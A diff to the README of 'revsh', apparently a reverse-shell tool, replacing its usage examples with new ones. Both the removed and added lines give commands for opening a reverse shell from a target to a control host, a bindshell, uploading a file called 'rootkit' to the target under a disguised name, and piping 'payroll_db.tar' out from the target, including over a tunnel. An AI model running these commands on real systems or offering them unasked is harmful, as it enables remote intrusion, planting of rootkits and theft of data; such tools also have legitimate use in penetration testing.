@@ -116,39 +116,31 @@ _revsh_ was developed on x86_64 Linux. Here is a brief list of Arch / OS combina
 
 ## Examples ##
 
-First, setup the local host to be the control host:
+Control host example IP: 192.168.0.42
+<br>
+Target host example IP:  192.168.0.66
 
-	empty@monkey:~$ revsh -c 192.168.0.42:9999
-
-Then connect out from the remote target host:
-
-	target@kitty:~$ ./revsh 192.168.0.42:9999
-
-We will now find a shell waiting for us back at the control host:
-
-	Listening on 192.168.0.42:9999...  Connected!
-	 Remote fingerprint expected: 09a348e737b96961d7ff9d55f958e771828f839e
-	 Remote fingerprint received: 09a348e737b96961d7ff9d55f958e771828f839e
-	Initializing... Done!
+	Interactive example on default port '2200':
+		control:	revsh -c
+		target:		revsh 192.168.0.42
 	
-	################################
-	# hostname: kitty
-	# ip address: 192.168.0.123
-	# real user: target
-	# effective user: target
-	################################
-	target@kitty:/$ ls -l /etc/passwd
-	-rw-r--r-- 1 root root 1538 Jul 18 22:50 /etc/passwd
-	target@kitty:/$
-
-Note, if you configured the binary at build time to change the IP:PORT address to 192.168.0.42:9999, then the above example becomes even cleaner.
-
-Local control host:
-
-	empty@monkey:~$ revsh -c
-
-Remote target host:
-
-	target@kitty:~$ ./revsh
-
+	Interactive example on non-standard port '443':
+		control:	revsh -c 192.168.0.42:443
+		target:		revsh 192.168.0.42:443
+	
+	Bindshell example:
+		target:		revsh -b
+		control:	revsh -c -b 192.168.0.66
+	
+	Non-interactive file upload example:
+		control:	cat ~/bin/rootkit | revsh -c -n
+		target:		revsh 192.168.0.42 > ./totally_not_a_rootkit
+	
+	Non-interactive file download example:
+		control:	revsh -c -n >payroll_db.tar
+		target:		cat payroll_db.tar | revsh 192.168.0.42
+	
+	Non-interactive file download example across existing tunnel:
+		control:	revsh -c -n 127.0.0.1:2291 >payroll_db.tar
+		target:		cat payroll_db.tar | revsh 127.0.0.1:2290
 
